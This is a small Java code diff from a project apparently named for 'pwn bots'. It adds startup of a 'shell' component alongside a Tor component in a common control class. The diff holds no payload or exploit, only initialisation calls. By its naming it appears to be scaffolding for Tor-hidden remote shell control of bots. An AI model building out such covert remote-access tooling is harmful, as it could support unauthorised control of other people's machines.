@@ -1,6 +1,7 @@
 package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.control;
 
 import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
+import java.io.IOException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -10,6 +11,7 @@ public class CommonControl {
 
     public void init() {
         //INIT CMD
+        CommonHeader.getSHELL_HEADER().init();
         //INIT CMD
 
         //INIT TOR
@@ -21,7 +23,8 @@ public class CommonControl {
         //INIT CMD
     }
 
-    public void start() {
+    public void start() throws IOException {
+        CommonHeader.getSHELL_HEADER().start();
         CommonHeader.getTOR_HEADER().start();
 
     }
